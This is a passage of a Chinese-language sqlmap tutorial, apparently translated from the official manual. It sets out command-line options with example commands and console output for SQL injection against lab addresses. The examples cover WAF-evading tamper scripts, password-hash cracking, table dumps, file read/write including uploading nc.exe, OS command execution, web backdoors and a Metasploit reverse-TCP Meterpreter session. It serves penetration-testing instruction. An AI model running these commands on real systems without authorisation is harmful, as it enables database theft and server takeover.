+<pre><code>python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "&rsquo;)" --suffix "AND (&rsquo;abc&rsquo;=&rsquo;abc"
+</code></pre>
+<p>这样执行的SQL语句变成：</p>
+<pre><code>$query = "SELECT * FROM users WHERE id=(&rsquo;1&rsquo;) &lt;PAYLOAD&gt; AND (&rsquo;abc&rsquo;=&rsquo;abc&rsquo;) LIMIT 0, 1"; 
+</code></pre>
+<h3>修改注入的数据</h3>
+<p>参数：--tamper</p>
+<p>sqlmap除了使用CHAR()函数来防止出现单引号之外没有对注入的数据修改，你可以使用--tamper参数对数据做修改来绕过WAF等设备。</p>
+<p>下面是一个tamper脚本的格式：</p>
+<pre><code># Needed imports
+from lib.core.enums import PRIORITY
+# Define which is the order of application of tamper scripts against
+# the payload
+__priority__ = PRIORITY.NORMAL
+def tamper(payload):
+&nbsp;&nbsp;&nbsp;&nbsp;'''
+&nbsp;&nbsp;&nbsp;&nbsp;Description of your tamper script
+&nbsp;&nbsp;&nbsp;&nbsp;'''
+&nbsp;&nbsp;&nbsp;&nbsp;retVal = payload
+&nbsp;&nbsp;&nbsp;&nbsp;# your code to tamper the original payload
+&nbsp;&nbsp;&nbsp;&nbsp;# return the tampered payload
+&nbsp;&nbsp;&nbsp;&nbsp;return retVal
+</code></pre>
+<p>可以查看 tamper/ 目录下的有哪些可用的脚本</p>
+<p>例如：</p>
+<pre><code>$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
+
+[hh:mm:03] [DEBUG] cleaning up configuration parameters
+[hh:mm:03] [INFO] loading tamper script 'between'
+[hh:mm:03] [INFO] loading tamper script 'randomcase'
+[hh:mm:03] [INFO] loading tamper script 'space2comment'
+[...]
+[hh:mm:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092
+[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057
+[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041
+[...]
+[hh:mm:04] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'
+[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONCAT(cHar(
+58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/**/elsE/**/0/**/
+ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/information_schema.tables/**/
+group/**/bY/**/x)a)
+[hh:mm:04] [INFO] GET parameter 'id' is 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING
+clause' injectable
+[...]
+</code></pre>
+<h2>探测</h2>
+<hr />
+<h3>探测等级</h3>
+<p>参数：--level</p>
+<p>共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</p>
+<p>这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。</p>
+<p>总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p>
+<h3>风险等级</h3>
+<p>参数：--risk</p>
+<p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p>
+<p>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>
+<p>测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p>
+<h3>页面比较</h3>
+<p>参数：--string,--not-string,--regexp,--code</p>
+<p>默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用--string参数添加字符串，--regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（--not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200。</p>
+<p>参数：--text-only,--titles</p>
+<p>有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用--text-only（HTTP响应体中不同）--titles（HTML的title标签中不同）。</p>
+<h2>注入技术</h2>
+<hr />
+<h3>测试是否是注入</h3>
+<p>参数：--technique</p>
+<p>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</p>
+<p>支持的探测方式如下：</p>
+<pre><code>B: Boolean-based blind SQL injection（布尔型注入）
+E: Error-based SQL injection（报错型注入）
+U: UNION query SQL injection（可联合查询注入）
+S: Stacked queries SQL injection（可多语句查询注入）
+T: Time-based blind SQL injection（基于时间延迟注入）
+</code></pre>
+<h3>设定延迟注入的时间</h3>
+<p>参数：--time-sec</p>
+<p>当使用基于时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒。</p>
+<h3>设定UNION查询字段数</h3>
+<p>参数：--union-cols</p>
+<p>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。</p>
+<h3>设定UNION查询使用的字符</h3>
+<p>参数：--union-char</p>
+<p>默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用--union-char只定UNION查询的字符。</p>
+<h3>二阶SQL注入</h3>
+<p>参数：--second-order</p>
+<p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。--second-order后门跟一个判断页面的URL地址。</p>
+<h2>列数据</h2>
+<hr />
+<h3>合并起来使用：-current-user&nbsp;--current-db&nbsp;--is-dba&nbsp;--users</h3>
+<h3>标志</h3>
+<p>参数：-b,--banner</p>
+<p>大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。</p>
+<h3>用户</h3>
+<p>参数：-current-user</p>
+<p>在大多数据库中可以获取到管理数据的用户。</p>
+<h3>当前数据库</h3>
+<p>参数：--current-db</p>
+<p>返还当前连接的数据库。</p>
+<h3>当前用户是否为管理用</h3>
+<p>参数：--is-dba</p>
+<p>判断当前的用户是否为管理，是的话会返回True。</p>
+<h3>列数据库管理用户</h3>
+<p>参数：--users</p>
+<p>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p>
+<h3>列出并破解数据库用户的hash</h3>
+<p>参数：--passwords</p>
+<p>当前用户有权限读取包含用户密码的表的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p>
+<p>例子：</p>
+<pre><code>$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --passwords -v 1
+[...]
+back-end DBMS: PostgreSQL
+[hh:mm:38] [INFO] fetching database users password hashes
+do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y
+[hh:mm:42] [INFO] using hash method: 'postgres_passwd'
+what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt]
+[hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'
+do you want to use common password suffixes? (slow!) [y/N] n
+[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)
+[hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'
+[hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'
+database management system users password hashes:
+[*] postgres [1]:
+&nbsp;&nbsp;&nbsp;&nbsp;password hash: md5d7d880f96044b72d0bba108ace96d1e4
+&nbsp;&nbsp;&nbsp;&nbsp;clear-text password: testpass
+[*] testuser [1]:
+&nbsp;&nbsp;&nbsp;&nbsp;password hash: md599e5ea7a6f7c3269995cba3927fd0093
+&nbsp;&nbsp;&nbsp;&nbsp;clear-text password: testpass
+</code></pre>
+<p>可以看到sqlmap不仅识别出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，这个爆破已经支持Oracle和Microsoft SQL Server。</p>
+<p>也可以提供-U参数来指定爆破哪个用户的hash。</p>
+<h3>列出数据库管理员权限</h3>
+<p>参数：--privileges</p>
+<p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。</p>
+<h3>列出数据库管理员角色</h3>
+<p>参数：--roles</p>
+<p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。</p>
+<p>仅适用于当前数据库是Oracle的时候。</p>
+<h3>列出数据库系统的数据库</h3>
+<p>参数：--dbs</p>
+<p>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p>
+<h3>列举数据库表</h3>
+<p>参数：--tables,--exclude-sysdbs,-D</p>
+<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</p>
+<p>如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p>
+<p>--exclude-sysdbs参数是指包含了所有的系统数据库。</p>
+<p>需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p>
+<h3>列举数据库表中的字段</h3>
+<p>参数：--columns,-C,-T,-D</p>
+<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p>
+<p>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p>
+<p>列举一个SQLite的例子：</p>
+<pre><code>$ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" --columns -D testdb -T users -C name
+[...]
+Database: SQLite_masterdb
+Table: users
+[3 columns]
++---------+---------+
+| Column&nbsp;&nbsp;| Type&nbsp;&nbsp;&nbsp;&nbsp;|
++---------+---------+
+| id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| INTEGER |
+| name&nbsp;&nbsp;&nbsp;&nbsp;| TEXT&nbsp;&nbsp;&nbsp;&nbsp;|
+| surname | TEXT&nbsp;&nbsp;&nbsp;&nbsp;|
++---------+---------+
+</code></pre>
+<h3>列举数据库系统的架构</h3>
+<p>参数：--schema,--exclude-sysdbs</p>
+<p>用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。</p>
+<p>加上--exclude-sysdbs参数，将不会获取数据库自带的系统库内容。</p>
+<p>MySQL例子：</p>
+<pre><code>$ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --schema --batch --exclude-sysdbs
+[...]
+Database: owasp10
+Table: accounts
+[4 columns]
++-------------+---------+
+| Column&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| Type&nbsp;&nbsp;&nbsp;&nbsp;|
++-------------+---------+
+| cid&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | int(11) |
+| mysignature | text&nbsp;&nbsp;&nbsp;&nbsp;|
+| password&nbsp;&nbsp;&nbsp;&nbsp;| text&nbsp;&nbsp;&nbsp;&nbsp;|
+| username&nbsp;&nbsp;&nbsp;&nbsp;| text&nbsp;&nbsp;&nbsp;&nbsp;|
++-------------+---------+
+
+Database: owasp10
+Table: blogs_table
+[4 columns]
++--------------+----------+
+| Column&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Type&nbsp;&nbsp;&nbsp;&nbsp; |
++--------------+----------+
+| date&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | datetime |
+| blogger_name | text&nbsp;&nbsp;&nbsp;&nbsp; |
+| cid&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| int(11)&nbsp;&nbsp;|
+| comment&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| text&nbsp;&nbsp;&nbsp;&nbsp; |
++--------------+----------+
+
+Database: owasp10
+Table: hitlog
+[6 columns]
++----------+----------+
+| Column&nbsp;&nbsp; | Type&nbsp;&nbsp;&nbsp;&nbsp; |
++----------+----------+
+| date&nbsp;&nbsp;&nbsp;&nbsp; | datetime |
+| browser&nbsp;&nbsp;| text&nbsp;&nbsp;&nbsp;&nbsp; |
+| cid&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| int(11)&nbsp;&nbsp;|
+| hostname | text&nbsp;&nbsp;&nbsp;&nbsp; |
+| ip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | text&nbsp;&nbsp;&nbsp;&nbsp; |
+| referer&nbsp;&nbsp;| text&nbsp;&nbsp;&nbsp;&nbsp; |
++----------+----------+
+
+Database: testdb
+Table: users
+[3 columns]
++---------+---------------+
+| Column&nbsp;&nbsp;| Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|
++---------+---------------+
+| id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| int(11)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |
+| name&nbsp;&nbsp;&nbsp;&nbsp;| varchar(500)&nbsp;&nbsp;|
+| surname | varchar(1000) |
++---------+---------------+
+[...]
+</code></pre>
+<h3>获取表中数据个数</h3>
+<p>参数：--count</p>
+<p>有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p>
+<p>列举一个Microsoft SQL Server例子：</p>
+<pre><code>$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --count -D testdb
+[...]
+Database: testdb
++----------------+---------+
+| Table&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| Entries |
++----------------+---------+
+| dbo.users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| 4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |
+| dbo.users_blob | 2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |
++----------------+---------+
+</code></pre>
+<h3>获取整个表的数据</h3>
+<p>参数：--dump,-C,-T,-D,--start,--stop,--first,--last</p>
+<p>如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取整个表的所有内容。</p>
+<p>使用-D,-T参数指适定想要获取哪个库的哪个表，不用-D参数时，默认使用当前库。</p>
+<p>列举一个Firebird的例子：</p>
+<pre><code>$ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
+[...]
+Database: Firebird_masterdb
+Table: USERS
+[4 entries]
++----+--------+------------+
+| ID | NAME&nbsp;&nbsp; | SURNAME&nbsp;&nbsp;&nbsp;&nbsp;|
++----+--------+------------+
+| 1&nbsp;&nbsp;| luther | blisset&nbsp;&nbsp;&nbsp;&nbsp;|
+| 2&nbsp;&nbsp;| fluffy | bunny&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|
+| 3&nbsp;&nbsp;| wu&nbsp;&nbsp;&nbsp;&nbsp; | ming&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |
+| 4&nbsp;&nbsp;| NULL&nbsp;&nbsp; | nameisnull |
++----+--------+------------+
+</code></pre>
+<p>可以获取指定库中的所有表的内容，只用-dump跟-D参数（不使用-T与-C参数）。</p>
+<p>也可以用-dump跟-C获取指定的字段内容。</p>
+<p>sqlmap为每个表生成了一个CSV文件。</p>
+<p>如果你只想获取一段数据，可以使用--start和--stop参数，例如，你只想获取第一段数据可hi使用--stop 1，如果想获取第二段与第三段数据，使用参数 --start 1 --stop 3。</p>
+<p>也可以用--first与--last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用--first 3 --last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p>
+<h3>获取所有数据库表的内容</h3>
+<p>参数：--dump-all,--exclude-sysdbs</p>
+<p>使用--dump-all参数获取所有数据库表的内容，可同时加上--exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。</p>
+<h3>搜索字段，表，数据库</h3>
+<p>参数：--search,-C,-T,-D</p>
+<p>--search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。</p>
+<p>可以在一下三种情况下使用：</p>
+<pre><code>-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。
+-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名
+-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。
+</code></pre>
+<h3>运行自定义的SQL语句</h3>
+<p>参数：--sql-query,--sql-shell</p>
+<p>sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。</p>
+<p>如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p>
+<p>列举一个Mircrosoft SQL Server 2000的例子：</p>
+<pre><code>$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1
+
+[...]
+[hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
+[hh:mm:14] [INFO] retrieved: foo
+SELECT 'foo':&nbsp;&nbsp;&nbsp;&nbsp;'foo'
+
+$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo', 'bar'" -v 2
+
+[...]
+[hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
+[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it into 
+distinct queries to be able to retrieve the output even if we are going blind
+[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)), 
+(CHAR(32)))
+[hh:mm:50] [INFO] retrieved: foo
+[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
+[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHAR(8000)), 
+(CHAR(32)))
+[hh:mm:50] [INFO] retrieved: bar
+[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
+SELECT 'foo', 'bar':&nbsp;&nbsp;&nbsp;&nbsp;'foo, bar'
+</code></pre>
+<h2>爆破</h2>
+<hr />
+<h3>暴力破解表名</h3>
+<p>参数：--common-tables</p>
+<p>当使用--tables无法获取到数据库的表时，可以使用此参数。</p>
+<p>通常是如下情况：</p>
+<pre><code>1、MySQL数据库版本小于5.0，没有information_schema表。
+2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。
+3、当前用户没有权限读取系统中保存数据结构的表的权限。
+</code></pre>
+<p>暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。</p>
+<p>列举一个MySQL 4.1的例子：</p>
+<pre><code>$ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner
+
+[...]
+[hh:mm:39] [INFO] testing MySQL
+[hh:mm:39] [INFO] confirming MySQL
+[hh:mm:40] [INFO] the back-end DBMS is MySQL
+[hh:mm:40] [INFO] fetching banner
+web server operating system: Windows
+web application technology: PHP 5.3.1, Apache 2.2.14
+back-end DBMS operating system: Windows
+back-end DBMS: MySQL &amp;lt; 5.0.0
+banner:&nbsp;&nbsp;&nbsp;&nbsp;'4.1.21-community-nt'
+
+[hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/txt/common-tables.txt'
+[hh:mm:40] [INFO] adding words used on web page to the check list
+please enter number of threads? [Enter for 1 (current)] 8
+[hh:mm:43] [INFO] retrieved: users
+
+Database: testdb
+[1 table]
++-------+
+| users |
++-------+
+</code></pre>
+<h3>暴力破解列名</h3>
+<p>参数：--common-columns</p>
+<p>与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。</p>
+<h2>用户自定义函数注入</h2>
+<hr />
+<p>参数：--udf-inject,--shared-lib</p>
+<p>你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。</p>
+<h2>系统文件操作</h2>
+<hr />
+<h3>从数据库服务器中读取文件</h3>
+<p>参数：--file-read</p>
+<p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p>
+<p>列举一个Microsoft SQL Server 2005的例子：</p>
+<pre><code>$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" \
+--file-read "C:/example.exe" -v 1
+
+[...]
+[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 2000
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP
+back-end DBMS: Microsoft SQL Server 2005
+
+[hh:mm:50] [INFO] fetching file: 'C:/example.exe'
+[hh:mm:50] [INFO] the SQL query provided returns 3 entries
+C:/example.exe file saved to:&nbsp;&nbsp;&nbsp;&nbsp;'/software/sqlmap/output/192.168.136.129/files/C__example.exe'
+[...]
+
+$ ls -l output/192.168.136.129/files/C__example.exe 
+-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe
+
+$ file output/192.168.136.129/files/C__example.exe 
+output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel
+80386 32-bit
+</code></pre>
+<h3>把文件上传到数据库服务器中</h3>
+<p>参数：--file-write,--file-dest</p>
+<p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。</p>
+<p>列举一个MySQL的例子：</p>
+<pre><code>$ file /software/nc.exe.packed 
+/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit
+
+$ ls -l /software/nc.exe.packed
+-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed
+
+$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \
+"/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
+
+[...]
+[hh:mm:29] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows 2003 or 2008
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
+back-end DBMS: MySQL &amp;gt;= 5.0.0
+
+[...]
+do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been successfully 
+written on the back-end DBMS file system? [Y/n] y
+[hh:mm:52] [INFO] retrieved: 31744
+[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes, 
+same size as the local file '/software/nc.exe.packed'
+</code></pre>
+<h3>运行任意操作系统命令</h3>
+<p>参数：--os-cmd,--os-shell</p>
+<p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。</p>
+<p>在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。</p>
+<p>那么他创建的这两个函数可以执行系统命令。在Microsoft SQL Server，sqlmap将会使用xp_cmdshell存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认禁制），sqlmap会重新启用它，如果不存在，会自动创建。</p>
+<p>列举一个PostgreSQL的例子：</p>
+<pre><code>$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
+--os-cmd id -v 1
+
+[...]
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: PostgreSQL
+[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:12] [INFO] the back-end DBMS operating system is Linux
+[hh:mm:12] [INFO] testing if current user is DBA
+[hh:mm:12] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist
+[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist
+[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file
+[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file
+do you want to retrieve the command standard output? [Y/n/a] y
+<strong>command standard output:</strong>&nbsp;&nbsp;&nbsp;&nbsp;'uid=104(postgres) gid=106(postgres) groups=106(postgres)'
+
+[hh:mm:19] [INFO] cleaning up the database management system
+do you want to remove UDF 'sys_eval'? [Y/n] y
+do you want to remove UDF 'sys_exec'? [Y/n] y
+[hh:mm:23] [INFO] database management system cleanup finished
+[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can 
+only be deleted manually
+</code></pre>
+<p>用--os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。</p>
+<p>当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言：</p>
+<pre><code>1、ASP
+2、ASP.NET
+3、JSP
+4、PHP
+</code></pre>
+<h3>Meterpreter配合使用</h3>
+<p>参数：--os-pwn,--os-smbrelay,--os-bof,--priv-esc,--msf-path,--tmp-path</p>
+<p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，并有四种方式执行它：</p>
+<pre><code>1、通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：--os-pwn。
+2、通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：--os-pwn。
+3、通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），--os-smbrelay。
+4、通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：--os-bof
+</code></pre>
+<p>列举一个MySQL例子：</p>
+<pre><code>$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" --os-pwn --msf-path /software/metasploit
+
+[...]
+[hh:mm:31] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows 2003
+web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0
+back-end DBMS: MySQL 5.0
+[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:31] [INFO] the back-end DBMS operating system is Windows
+how do you want to establish the tunnel?
+[1] TCP: Metasploit Framework (default)
+[2] ICMP: icmpsh - ICMP tunneling
+&amp;gt; 
+[hh:mm:32] [INFO] testing if current user is DBA
+[hh:mm:32] [INFO] fetching current user
+what is the back-end database management system architecture?
+[1] 32-bit (default)
+[2] 64-bit
+&amp;gt; 
+[hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist
+[hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist
+[hh:mm:33] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:33] [INFO] retrieving MySQL base directory absolute path
+[hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file
+[hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file
+how do you want to execute the Metasploit shellcode on the back-end database underlying 
+operating system?
+[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
+[2] Stand-alone payload stager (file system way)
+&amp;gt; 
+[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode 
+which connection type do you want to use?
+[1] Reverse TCP: Connect back from the database host to this machine (default)
+[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports 
+between the specified and 65535
+[3] Bind TCP: Listen on the database host for a connection
+&amp;gt; 
+which is the local address? [192.168.136.1] 
+which local port number do you want to use? [60641] 
+which payload do you want to use?
+[1] Meterpreter (default)
+[2] Shell
+[3] VNC
+&amp;gt; 
+[hh:mm:40] [INFO] creation in progress ... done
+[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, please wait..
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o
+_&nbsp;&nbsp;_&nbsp;&nbsp;_&nbsp;&nbsp;&nbsp;&nbsp;_ _|_&nbsp;&nbsp;__,&nbsp;&nbsp; ,&nbsp;&nbsp;&nbsp;&nbsp;_&nbsp;&nbsp;| |&nbsp;&nbsp;__&nbsp;&nbsp;&nbsp;&nbsp;_|_
